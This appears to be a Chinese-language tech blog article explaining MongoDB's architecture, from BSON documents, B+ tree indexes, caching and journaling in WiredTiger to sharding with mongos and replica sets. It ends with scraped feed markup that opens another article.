<p>很多预留的字段都用不上</p>
<p>而且游戏迭代频繁，每次增加活动时，都需要修改表结构，很麻烦。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a85fbb8f809340ec8114e8ba3369b415~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=3NWJMx1UWm%2FOkyG1%2Frqc%2BQzFZpU%3D" alt="每次增加活动都需要修改表结构" loading="lazy"/></p>
<p>每次增加活动都需要修改表结构</p>
<p>那么问题就来了，有没有一种既灵活又高效的存储方案？</p>
<p>有！没有什么是加一层中间层不能解决的，如果有，那就再加一层。</p>
<p>这次我们要加的中间层，是 MongoDB。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2777837f8559413b82e0b5c3e1cff2ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=eFHaEoI9NL6r65l72q%2FL4%2Fma1LI%3D" alt="MongoDB是什么" loading="lazy"/></p>
<p>MongoDB是什么</p>
<h2 data-id="heading-0">MongoDB是什么？</h2>
<p>先说结论，MongoDB可以简单理解为，就是个"数据结构灵活点的Mysql"。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c2f5044a70849019abe1dd061fab7d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=p8Um6S2RGeVNFcwBnnTwSJW95zE%3D" alt="mongodb是数据结构灵活点的Mysql" loading="lazy"/></p>
<p>mongodb是数据结构灵活点的Mysql</p>
<p>Mysql的表是由多个行组成，每个行又由多个列组成。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e92ee5c3647e468891cfdcab846f16c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=2HlsWuCp9MFHcZMV361wtTapUOw%3D" alt="表由行组成" loading="lazy"/></p>
<p>表由行组成</p>
<p>由于"列"这一概念的存在，导致了前面提到的表扩展和字段预留空间浪费的问题。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac23794f93d643708608b9f9dc6254de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=2panOmLmt63WIwOxErFicXE6OS8%3D" alt="列的概念存在导致了问题" loading="lazy"/></p>
<p>列的概念存在导致了问题</p>
<p>那我们索性抛弃列这个概念，将原来的多个列，聚合到一个长得像json的数据结构里，对于没用到的字段，不用预留，干脆就没有，我们管它叫文档, document，就像这样：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef63c4fac152486bbe30151810820b14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=LS1j56xVJ56ylFLdrsRYjl57240%3D" alt="文档document" loading="lazy"/></p>
<p>文档document</p>
<p>每个文档都有一个_id字段，也叫主键ID, 跟mysql表的主键ID是一个意思，用来唯一定位数据。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9aa24af606b40d38f4188cbd2e87d72~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=fZc4FIVetqwdMn4nZtgSwO1ZZFU%3D" alt="主键ID" loading="lazy"/></p>
<p>主键ID</p>
<p>文档内部想加什么字段就加什么字段，文档和文档之间的字段不需要完全一致，比如A文档有是否拜师字段，B文档没有。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a4134c51e294516b40a81465cef24f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=8vi8roJ3RBqWxrH7x9csz6GbuMc%3D" alt="文档和文档之间的字段不需要完全一致" loading="lazy"/></p>
<p>文档和文档之间的字段不需要完全一致</p>
<p>这样就完全不需要像 MySQL 那样提前定义表结构。</p>
<p>之前MySQL数据表里的一行数据，现在就成了一个文档。</p>
<p>既然MySQL的多行数据可以组合到一起，构成一张数据表，那多个文档也可以组合到一起，构成一个集合，又叫collection。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85f1987cd66744168bf5392c7f948d6c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=pln3xRnahErKhlTbCx9tTDo9zkI%3D" alt="collection" loading="lazy"/></p>
<p>collection</p>
<p>文档和集合都是MongoDB里的核心概念。</p>
<p>如果说mysql是一个，用于读写数据表行列的服务进程，那MongoDB本质上就是个，用于读写集合文档的服务进程。</p>
<p>我们通常会使用SQL语句，读写MySQL的数据，MongoDB也有自己的查询语法，而且看起来跟SQL差异比较大，</p>
<p>比如MongoDB的find语句类似于mysql的select语句。updateOne就类似于mysql的update语句。</p>
<p>对应关系就像下面这样：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30b62157b5b048d7b87736357f729a30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=nQ8ZfKxKMqGcem%2FJ8IC%2FdZaYZ74%3D" alt="查询语句" loading="lazy"/></p>
<p>查询语句</p>
<p>接下来，我们假装不了解MongoDB，来看下它是怎么实现的。</p>
<p>看之前，你点赞了吗？关注了吗？谢谢！</p>
<h2 data-id="heading-1">BSON 编码</h2>
<p>前面提到，文档长得像JSON，但JSON只支持数字，字符串这类基础类型，想要表达二进制这类常用存储类型，还要做一层Base64编码，不够高效，既然MongoDB的定位是存储，那当然要支持二进制的高效读写。所以，我们在JSON的基础上做下扩展，让它直接支持二进制等数据类型，也就成了二进制JSON，Binary JSON，简称BSON。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/def7b8ed8cba4cc0b5a7e2567e58d450~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=ACHT7gwjCbuDzu7%2FXsTMcvJ%2FvMY%3D" alt="BSON" loading="lazy"/></p>
<p>BSON</p>
<h2 data-id="heading-2">数据页</h2>
<p>有了BSON文档，下一步就是考虑将它们持久化到磁盘中。</p>
<p>就像excel数据表在磁盘上是个.xls 文件，我们也可以将一个个BSON文档组成的集合，写到磁盘里.wt为后缀名的文件上。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ed1f32487c4413389902597097cfd09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=XecYlLLR5ruMJQ88MAUFP1WJZ6Y%3D" alt="wt后缀文件" loading="lazy"/></p>
<p>wt后缀文件</p>
<p>集合越大，磁盘上的文件也就越大。</p>
<p>直接读写一个大文件里的全部数据会很慢，所以将数据拆成一个个数据页，每个页大小 32KB。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8461d39388747abb1a4abaf1c33bead~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=dxNnSNgCsu4olc1xBjYW%2BfwR5QI%3D" alt="每个页大小 32KB" loading="lazy"/></p>
<p>每个页大小 32KB</p>
<p>现在如果我们需要通过服务进程，读写某些个BSON文档数据，就只需要读写磁盘里的某几个数据页就好，不需要加载整个wt文件，大大减少了 IO 开销。</p>
<h2 data-id="heading-3">变种 B+ 树索引</h2>
<p>集合里的多个文档，已经分散到多个32KB的数据页里，多个数据页又组成了.wt文件。</p>
<p>那问题就来了，如果我们已知某个文档主键_id，怎么快速找到包含这个文档的数据页呢？</p>
<p>好办，可以为每个数据页加入页号。</p>
<p>由于每个文档本身就自带一个_id主键，我们可以按主键大小排序，将每个数据页里最小的主键序号和所在页的页号提出来，放入到一个新生成的数据页中，并且给数据页加入层级的概念。</p>
<p>这样我们就可以通过上层的数据页快速缩小查找范围，最终定位到要查的数据页。通过这个方式，加速查找数据页的过程。</p>
<p>现在页跟页之间看起来就像是一棵倒过来的树，这棵可以加速查找数据页的树，就是我们常说的B+树索引。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/018e8b2b154a44b4b2abee616e0f2c5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=vxkGwFYIbiH5UdV9O5xJL7s29xc%3D" alt="B+树索引" loading="lazy"/></p>
<p>B+树索引</p>
<p>上面提到的是针对主键的索引，叫主键索引。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/077d3617efed40348f12c2fa30661d34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=8vvcXkrK2T%2B6DRgKlwzkZ6fO7Pk%3D" alt="主键索引" loading="lazy"/></p>
<p>主键索引</p>
<p>按同样的思路，也可以为其他文档字段去建立索引，比如用户名字段，这样我们就能快速查找到名字为 xx 的用户有哪些，这就是所谓的辅助索引。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f8205059e424988a01fa75e6acbeec1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=g8hovpAgrM%2FvwqX4wZ9My2LhjEc%3D" alt="辅助索引" loading="lazy"/></p>
<p>辅助索引</p>
<p>这一点跟mysql的B+树几乎一模一样，但不同的是，mysql更新B+树的数据页时，为了防止并发写冲突，从根到叶子节点的搜索中会加入短暂内存锁，并对目标叶的行记录加锁；而MongoDB写数据时，几乎不对数据页加锁，直接复制个新的数据页，出来写，也就是所谓的写时复制, Copy On Write**，这样原来的数据页还能对外提供读操作，写操作则在新的数据页上进行，两者互不影响。</p>
<p>后面再找机会将复制出来的页合并到原有的B+树结构中，这样并发读写性能更好。</p>
<p>从效果上来看，就像是在原来的B+树基础上，挂了多个复制页，本质上是变种B+树。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f80ae2ef8a05429783d461e2e6c8061a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=%2FgNJp3I25m3mKFKyYIyOi64EQhs%3D" alt="变种B+树" loading="lazy"/></p>
<p>变种B+树</p>
<p>注意，网上有很多说mongodb底层用的是，非叶子节点包含完整文档数据的b树，别听他们的，以我为准。</p>
<h2 data-id="heading-4">加入缓存</h2>
<p>有了索引，查询数据是变高效了，但数据本质上，还是在磁盘里，每次查询都要读磁盘，略慢了些。</p>
<p>怎么办呢？我们可以在服务进程里加个缓存，也叫Cache，把经常访问的磁盘热点数据页放到cache里，查询优先查cache，查不到再去查磁盘，这样磁盘IO变少，查询就快多了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ffa3fafca904f4aa48c377345e7aa28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=nxAeao3YjOgFNqAzJ6d%2FT5xK5ks%3D" alt="加个缓存" loading="lazy"/></p>
<p>加个缓存</p>
<p>怕数据量太大内存扛不住，还可以根据一些策略删除掉一些内存。比如可以将最近最少使用的内存删掉，也就是， Least Recently Used, LRU**,这样不仅解决了内存过大的问题，还让 缓存里的数据全是热点数据。真是一箭双雕。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35436dc3fdaa4f13ba10a6f2102885bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=oZoyYaYQiYsNlkC%2FuV9hUV5MMrk%3D" alt="LRU" loading="lazy"/></p>
<p>LRU</p>
<h2 data-id="heading-5">写前日志 Journal</h2>
<p>上面提到的Cache里的数据页，本质上都是内存。</p>
<p>如果服务崩了，内存里的数据页还没来得及写入磁盘，那数据不就丢了吗？有解法吗？</p>
<p>有！对所有写操作，都先将变更行为，记录到一个叫Journal Buffer的缓冲区里，然后再更新到数据页中，Journal Buffer的数据会定时刷到磁盘的Journal文件中。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1687a15e6837417eac21fbb5c9c19b0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=kxMwozE%2Fpl1cpg136A%2FDJI5oUPs%3D" alt="Journal是什么" loading="lazy"/></p>
<p>Journal是什么</p>
<p>如果服务进程崩溃了，那进程重启后，就能通过Journal文件找到历史操作记录，重做数据，尽可能保证数据不丢失。</p>
<p>这时候问题就来了，我有这功夫更新 Journal 文件，直接将 cache的数据写入到磁盘不香吗？</p>
<p>不太一样，Journal文件 是<strong>顺序</strong>写入的，cache 的内存数据是<strong>随机分散</strong>在磁盘各处的，<strong>顺序写磁盘性能是随机写的几十倍</strong>，所以很多存储系统在写数据时都会搞个日志来记录操作，方便服务重启后进行数据对账，确保数据的一致性和完整性，这类操作就是所谓的 Write-Ahead Logging (WAL) 。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dfac22f4afb42f48c0e802e39ce78fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=7l9YHZ63iBh6Knf06Lj%2Bp90lMWI%3D" alt="WAL是什么" loading="lazy"/></p>
<p>WAL是什么</p>
<h2 data-id="heading-6">Checkpoint机制</h2>
<p>注意，上面提到先记录Journal写操作，再更新数据页，此时数据依然在内存中，那内存中的数据什么时候写入磁盘呢？</p>
<p>如果等内存满了再写，一次写入量太大，性能会很差。如果写得太频繁，又会占用磁盘IO，影响读操作。</p>
<p>怎么办？</p>
<p>我们可以让系统，定期把内存中已修改但未写入磁盘的数据页，也就是脏页，一次性批量写入磁盘。这种定期批量写入的机制，这就是所谓的Checkpoint机制。</p>
<p>因为数据已经安全写入磁盘了，所以在这个时间点之前的Journal日志就可以删除了，不需要再保留这些历史操作记录。</p>
<h2 data-id="heading-7">WiredTiger是什么？</h2>
<p>到这里，我们通过BSON文档，这种可以包含任意字段的数据结构，替代了mysql的行列的概念，让存储格式更加灵活。</p>
<p>将文档放入数据页和wt文件中，实现了高效的磁盘存储。</p>
<p>再通过变种B+树索引和写时复制机制，实现了快速数据查找和高并发写入。</p>
<p>为了进一步提升性能，引入了Cache，把热点数据放到内存中，大幅减少了磁盘IO。</p>
<p>用写前日志Journal和Checkpoint机制，保证了数据持久化。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/260d41a4cead4143bdea756562561a41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=Gw5800rYuQWC9xY60ZLtMnc4w3M%3D" alt="WiredTiger" loading="lazy"/></p>
<p>WiredTiger</p>
<p>它们共同构成了 <strong>WiredTiger</strong> 存储引擎。并对外提供一系列函数接口。比如update()用于更新数据，search()用于查询数据。</p>
<p>我们平时写的mongodb查询语句，最终都会转换成 WiredTiger 提供的函数接口调用。</p>
<p>比如updateOne()会转换为update()方法。</p>
<p>find()会转换为search()方法。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2da35b9a228a40609d804393a3aca9f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=aQevvYEcAFjt4Mvj5WwoGrBJ7e4%3D" alt="mongodb_配图.026.png" loading="lazy"/></p>
<p>mongodb查询语句</p>
<p>但问题就来了，我们平时读写 mongodb 用的查询语句，是怎么转成存储引擎的函数接口的呢？</p>
<p>那就需要介绍 Server 层了。</p>
<h2 data-id="heading-8">Server 层架构</h2>
<p>Server 层，本质上是mongodb查询语句 和 WiredTiger 存储引擎之间的中间层。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09459f1a6d354ba88c28a41e7eb29652~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=Khd5WWL2FQoxZLq4h8Zg6Ck0R1E%3D" alt="Server 层" loading="lazy"/></p>
<p>Server 层</p>
<p>它内部有一个连接管理模块，用于管理来自客户端应用的网络连接。</p>
<p>还有一个查询解析器，用于解析 MongoDB 的查询语句语法，判断查询语句有没有语法错误，比如字段名是否正确等。</p>
<p>再提供一个查询优化器，用于根据一定的规则选择该用什么索引，生成执行计划。</p>
<p>之后，提供一个执行器，根据执行计划去调用WiredTiger 存储引擎的接口函数。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a60ef5adfd03482c887005d398604ccb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=lwYdr6GoQsHr6B491wKeYdp3cQo%3D" alt="server层内部" loading="lazy"/></p>
<p>server层内部</p>
<p><strong>server 层和</strong>存储引擎层共同构成了一个完整的文档数据库，它就是我们常说的 <strong>MongoDB 数据库</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f7365311c124b5cb7eedf4b4ff1b22c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=ycqimMAK%2BsgReT24ckAXaQxa%2FrM%3D" alt="MongoDB 数据库" loading="lazy"/></p>
<p>MongoDB 数据库</p>
<p>并且，查询引擎和存储引擎层是通过接口函数进行解耦的，换句话说就是，只要实现了上面这些接口函数，就能作为存储引擎与server层对接。</p>
<p>比如，MongoDB 早期用的是 MMAPv1 存储引擎，后来才支持的 WiredTiger。现在 WiredTiger 已经成为默认的存储引擎。</p>
<h2 data-id="heading-9"><strong>oplog 是什么</strong></h2>
<p>你听说过删库跑路吧，为了防止数据库表被删除带来的影响， server 层会将历史上<strong>所有变更操作记录到磁盘上的日志文件中</strong>，这个日志文件就是所谓的 <strong>oplog</strong> 。一旦误删集合，就可以利用 <strong>oplog</strong> 来恢复数据。</p>
<p>那么问题就来了，wiretiger 有一个 Journal日志 也做类似的事情，为什么还要多此一举？评论区告诉我答案。</p>
<h2 data-id="heading-10">单机MongoDB</h2>
<p>如果你看过我之前做的「mysql」相关的视频，你会发现，mongodb和mysql的架构实现，惊人的相似。</p>
<p>我甚至演都不演了，很多素材都直接复用了。</p>
<p>如果说mysql本质上就是个通过b+树，读写数据页里行列数据的单机服务。那mongodb就是个通过变种b+树，读写数据页里集合数据的单机服务。</p>
<p>MongoDB在WiredTiger存储引擎的加持下，高性能是有了，但高可扩展和高可用是一点没看到。回到视频开头的问题，面对十亿级数据量时，单机CPU、内存、磁盘都会成为瓶颈。我们先看下怎么解决扩展性问题。</p>
<h2 data-id="heading-11">高扩展性</h2>
<p>既然数据量太大，那我们就「切」。</p>
<p>将10亿条游戏用户数据，按主键ID范围切分，0到1kw放一个MongoDB里，1kw到2kw放另一个MongoDB里，每个MongoDB只处理1kw条数据。我们称每个MongoDB为一个分片。</p>
<p>再将多个MongoDB分片分散部署在多台机器上，每台机器就是一个Node。通过增加Node来缓解资源压力。</p>
<p>但这又引入了新问题，<strong>客户端应用怎么知道，某条数据存储在哪个分片上？</strong></p>
<p>我们可以在客户端和分片之间，加一层路由服务，它可以根据查询条件，计算出数据在哪个分片，然后转发请求到分片中、收集分片的结果、合并排序**后返回给客户端。这个路由服务，又叫mongos，当读写请求量变大时，mongos也可以扩展。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6155db7251de43f1ad0fac21625f93b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=4TmBjrBYRviO0sTlSgCwFCWa%2Bh4%3D" alt="mongos是什么" loading="lazy"/></p>
<p>mongos是什么</p>
<p>mongos的配置信息，来自于配置服务器，Config Server**，每个分片都连接config server，并主动上报自身信息，所以Config Server存储了有哪些分片，以及每个分片负责哪些数据范围等信息。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9da9b78f16d4ef48fcbc1145ebddec0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=v091wnpJIZmtj0mErV6pWPGd%2BhE%3D" alt="Config Server是什么" loading="lazy"/></p>
<p>Config Server是什么</p>
<h2 data-id="heading-12">高可用</h2>
<p>到这里，问题又又来了，如果其中一个Node挂了，那Node里所有分片都无法对外提供服务了。怎么做到高可用？送分题了属于是，我们可以给每个分片都多加几个副本。</p>
<p>将分片分为主节点和副本节点。主节点将数据实时同步给副本节点，副本节点既可以对外提供读能力，还能在主节点挂了的时候，通过选举机制升级成新的主节点，保证系统高可用。</p>
<p>这种由一个主节点和多个副本节点组成的集群，就叫副本集，Replica Set**，。有点类似于mysql的主从模式。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36a7fb7120d145959df94262bd2fd5dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=ZOh3QhilYICTEJ%2Bysd7Ss%2FoZ9yU%3D" alt="Replica Set" loading="lazy"/></p>
<p>Replica Set</p>
<h2 data-id="heading-13">分布式MongoDB集群</h2>
<p>像这种通过多个MongoDB实例切分存储数据，实现扩展性，并通过mongos路由分发请求、聚合排序结果，通过Config Server管理配置信息，再给每个分片实例加入副本节点实现高可用的架构，就叫分布式MongoDB集群。</p>
<p>接下来我们用一个实际例子将上面提到的内容串起来，看看分布式MongoDB集群中的完整数据流程。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4022f98efa504523a6f259a9315fcbad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770703325&amp;x-signature=dFeBNHs8%2BYxfv5a%2B9bLLIxr5Zeg%3D" alt="分布式MongoDB集群" loading="lazy"/></p>
<p>分布式MongoDB集群</p>
<h3 data-id="heading-14">查询更新流程</h3>
<p>不管是读还是写，客户端应用都会连接到mongos，发起请求。</p>
<p>mongos 根据请求，基于缓存的分片信息，确定数据在哪个分片上。必要时向 Config Server 刷新分片信息。</p>
<p>再将请求，转发到对应的分片副本集，注意这里可能涉及多个分片。</p>
<p>在每个MongoDB分片内部，客户端请求先到达分片的server层，经过查询解析器解析查询语法、查询优化器选择索引生成执行计划，再给到执行器调用WiredTiger的函数接口。</p>
<ul>
<li>• 对于读操作，请求发送到WiredTiger存储引擎。WiredTiger先检查Cache中是否存在所需数据页，存在则直接返回。否则从磁盘读取数据页加载到cache中，再返回数据给mongos。mongos收集各分片的查询结果，进行合并、排序等处理，最终返回给客户端。</li>
<li>• 对于写操作，变更操作记录到Journal文件中，同时复制一份Cache的数据页，写入到复制页中。WiredTiger结合Checkpoint机制，将修改后的数据页写回磁盘。写操作完成后，分片主节点会将数据，实时同步给副本节点。当主节点和足够数量的副本节点都写入成功后，分片会返回写入确认给mongos。mongos收到所有相关分片的写入确认后，最终向客户端返回写操作成功的响应。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot自动配置的黑魔法：5个你可能不知道的底层原理]]></title>    <link>https://juejin.cn/post/7602161364892729344</link>    <guid>https://juejin.cn/post/7602161364892729344</guid>    <pubDate>2026-02-03T04:18:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602161364892729344" data-draft-id="7602161364892712960" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot自动配置的黑魔法：5个你可能不知道的底层原理"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2026-02-03T04:18:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot自动配置的黑魔法：5个你可能不知道的底层原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
